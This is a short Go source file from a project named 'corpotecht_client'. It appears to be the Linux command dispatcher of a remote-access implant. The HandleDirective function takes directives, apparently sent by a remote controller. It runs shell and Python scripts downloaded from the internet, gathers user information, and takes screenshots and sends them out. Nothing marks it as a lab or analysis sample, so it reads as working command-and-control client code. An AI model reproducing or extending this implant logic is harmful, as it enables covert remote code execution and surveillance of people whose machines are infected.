package linux

import (
	c "corpotecht_client/common"
	"corpotecht_client/crossplatform"
	"fmt"
	"log"
)

func HandleDirective(directive c.Directive) {
	//defer utils.RecoverFromCrash() // in case something goes wrong

	fmt.Printf("Received directive: %s\n", directive.Command)
	switch directive.Command {
	case "terminal":
		if len(directive.Parameters) > 0 {
			ExecShellScriptFromInternet(directive.Parameters[0])
		} else {

			log.Println("Invalid directive received.")
		}
	case "python":
		if len(directive.Parameters) > 0 {
			ExecPythonScriptFromInternet(directive.Parameters[0])
		} else {
			log.Println("Invalid directive received.")
		}
	case "userinfo":
		UserInfo()
	case "screenshot":
		crossplatform.TakeAndSendScreenshot()
	}
}
